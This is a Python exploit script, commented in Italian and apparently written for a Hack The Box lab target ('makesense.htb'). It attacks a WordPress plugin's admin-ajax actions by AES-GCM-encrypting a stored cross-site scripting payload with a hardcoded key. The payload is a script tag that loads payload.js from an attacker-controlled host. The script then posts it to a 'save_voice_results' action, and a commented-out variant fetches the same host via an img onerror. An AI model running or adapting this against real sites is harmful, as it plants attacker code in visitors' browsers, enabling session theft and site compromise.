import requests
import json
import base64
import os
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# FUNZIONE PER CRIPTARE IL JSON DA INVIARE

def cripta_chiave(secret_string, payload_dict):
    # 1. Derivazione della chiave
    # JS: await crypto.subtle.digest('SHA-256', encoder.encode(ENCRYPTION_KEY));
    key_bytes = secret_string.encode('utf-8')
    aes_key = hashlib.sha256(key_bytes).digest()

    # 2. Generazione dell'IV (Vettore di Inizializzazione)
    # JS: crypto.getRandomValues(new Uint8Array(12));
    iv = os.urandom(12)

    # 3. Preparazione dei dati in JSON
    # JS: encoder.encode(JSON.stringify(payload));
    json_data = json.dumps(payload_dict).encode('utf-8')

    # 4. Cifratura AES-GCM
    # La funzione encrypt() unisce automaticamente il ciphertext 
    # e il tag di autenticazione di 16 byte alla fine.
    aesgcm = AESGCM(aes_key)
    ciphertext_with_tag = aesgcm.encrypt(iv, json_data, None)

    # 5. Assemblaggio e codifica Base64
    # JS: combined.set(iv, 0); combined.set(new Uint8Array(encrypted), iv.length);
    combined_bytes = iv + ciphertext_with_tag
    
    b64_payload = base64.b64encode(combined_bytes).decode('utf-8')
    return b64_payload

# INIZIO EXPLOIT

IP='10.10.15.135'
PORTA=8000

# chiave di criptazione
CHIAVE= 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

# ATTENZIONE! cambiare il "nonce" se necessario
nonce_utente="d5904a7e8e"
post_id=69

url='https://makesense.htb/wp-admin/admin-ajax.php'

#payload = f"<img src=\"x\" onerror=\"fetch('http://{IP}:{PORTA}/xss_fidato')\">"

payload=f"<script src='http://10.10.15.135:8000/payload.js'></script>"

parametri={
    "action":"submit_contact_form",
    "nonce":nonce_utente,
    "name":"Alessandro",
    "email":"alexshadow@gmail.com",
    "phone":"1234567890",
    "message":"ciaoooo"
}

try:
    risposta=requests.post(url,data=parametri,verify=False)
    if(risposta.status_code==200):
        print("[+] il server ha accettato i dati di contatto")
    else:
        print("[X] il server ha rifiutato i dati di contatto")
except:
    print("ERRORE DI RETE")

print("[+] criptazione payload...")
payload_da_crittografare={
    "transcription": payload,
    "summary": "Messaggio di test"
}
payload_crittografata=cripta_chiave(CHIAVE,payload_da_crittografare)
print("[+] payload crittografata")

print("[+] creazione json con dati finali...")
dati_infezione={
    "action":"save_voice_results",
    "nonce": nonce_utente,
    "post_id": post_id,
    "encrypted_payload":payload_crittografata
}
print("[+] creazione json con dati finali completata")

try:
    risposta_finale=requests.post(url,data=dati_infezione,verify=False)
    if(risposta_finale.status_code==200):
        print("[+] il server ha accettato il json finale")
    else:
        print("[X] il server ha rifiutato il json finale")
except:
    print("ERRORE DI RETE")